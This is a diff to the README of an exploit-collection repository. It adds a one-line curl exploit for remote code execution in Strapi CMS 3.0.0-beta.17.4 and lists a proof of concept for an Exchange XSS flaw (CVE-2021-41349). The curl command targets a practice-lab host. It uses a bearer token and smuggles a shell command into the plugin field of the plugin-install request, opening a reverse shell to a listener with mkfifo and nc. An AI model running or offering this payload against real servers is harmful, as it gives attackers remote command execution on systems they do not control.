@@ -5,6 +5,11 @@ expbox is an exploit code collection repository
 
 
 ### List
+**Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution**
+```
+curl -i -s -k -X $'POST' -H $'Host: api-prod.horizontall.htb' -H $'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMwMzE5NzEwLCJleHAiOjE2MzI5MTE3MTB9.AfJr81dyxnmzlutCKArmf0kBgFCcDDhsk91IYNDpTFM' -H $'Content-Type: application/json' -H $'Origin: http://api-prod.horizontall.htb' -H $'Content-Length: 123' -H $'Connection: close' --data $'{\"plugin\":\"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.42 4444 >/tmp/f)\",\"port\":\"80\"}' $'http://api-prod.horizontall.htb/admin/plugins/install'
+```
+
 **[CVE-2021-41349 Exchange XSS PoC](https://github.com/0x0021h/expbox/blob/main/cve-2021-41349-poc.py)**
 ```
 <= Exchange 2013 update 23
